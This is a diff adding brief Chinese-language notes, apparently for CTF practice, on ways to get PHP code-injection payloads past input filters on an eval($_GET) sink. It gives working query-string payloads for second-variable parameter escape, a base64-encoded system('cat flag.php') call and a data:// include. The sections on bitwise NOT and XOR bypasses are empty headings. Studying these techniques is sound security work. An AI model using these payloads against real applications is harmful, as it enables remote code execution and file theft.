@@ -1,0 +1,12 @@
+参数逃逸：通过创造新变量并在检测之后赋值来逃脱匹配
+1.      ?c=eval($GET[x]);&x=phpinfo();
+        eval($_GET['c'])
+2.      进行进一步加密绕过
+        ?c=eval(base64_decode($_GET[x]));&x=Y3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=
+        eval($_GET['c'])
+伪协议绕过：使用文件包含或其他能够使用伪协议的函数方法
+        ?c=include(data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+)
+位运算绕过:ascii码的二进程层面进行运算绕过
+1.取反(~):
+
+2.异或()
